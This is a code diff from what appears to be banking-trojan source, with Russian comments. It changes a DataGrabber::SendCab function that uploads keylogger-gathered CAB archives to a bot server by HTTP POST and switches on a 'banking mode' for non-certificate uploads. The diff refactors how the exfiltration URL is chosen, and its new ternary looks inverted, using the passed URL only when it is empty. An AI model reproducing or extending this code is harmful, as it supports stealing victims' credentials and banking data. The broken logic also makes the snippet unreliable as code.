@@ -1929,7 +1929,7 @@ bool DataGrabber::SendFormGrabberData(PDataFile File)
 	return R;
 }
 
-bool DataGrabber::SendCab(PCHAR URL, PCHAR CabFileName, PCHAR AppName, bool* InvalidFile)
+bool DataGrabber::SendCab(PCHAR aURL, PCHAR CabFileName, PCHAR AppName, bool* InvalidFile)
 {
 	// Отправляем пост запрос на скрипт хранения данных кейлогера
 	if (InvalidFile != NULL)
@@ -1939,19 +1939,18 @@ bool DataGrabber::SendCab(PCHAR URL, PCHAR CabFileName, PCHAR AppName, bool* Inv
 		return false;
 
 
+	bool IsBanking = AnsiStr::Hash(AppName) != 0xC797974 /* cert */;
 	// При любой отправке каба включаем режим Банк
 	// игнорируем отправку сертификатов
-    if (AnsiStr::Hash(AppName) != 0xC797974 /* cert */)
-    	SetBankingMode();
+	if (IsBanking)
+		SetBankingMode();
 
 
 	// Уведомляем монитор об отправке каба
 	MONITOR_DELIMETED_MSG(BMCONST(MessageSendCab), AppName, ":", CabFileName);
 
 	// Инициализируем адрес
-	bool FreeUrl = STR::IsEmpty(URL);
-	if (FreeUrl)
-		 URL = GetBotScriptURL(SCRIPT_CAB);
+	string URL = (STRA::IsEmpty(aURL)) ? string(aURL) : GetBankingScriptURL(SCRIPT_CAB, IsBanking);
 
     LDBG("Loader", "Отправляем CAB архив с именем [%s]", AppName);
 
@@ -1978,7 +1977,7 @@ bool DataGrabber::SendCab(PCHAR URL, PCHAR CabFileName, PCHAR AppName, bool* Inv
 	THTTPResponse Response;
 	ClearStruct(Response);
 
-    bool Result = HTTP::Post(URL, Data, NULL, &Response);
+    bool Result = HTTP::Post(URL.t_str(), Data, NULL, &Response);
  
 	if (Result)
 		Result = CheckValidPostResult(&Response, NULL);
@@ -2003,8 +2002,6 @@ bool DataGrabber::SendCab(PCHAR URL, PCHAR CabFileName, PCHAR AppName, bool* Inv
 
 	HTTPResponse::Clear(&Response);
 	MultiPartData::Free(Data);
-	if (FreeUrl)
-		STR::Free(URL);
 
 	if (Result)
 		LDBG("Loader", "CAB [%s] успешно отправлен", AppName);
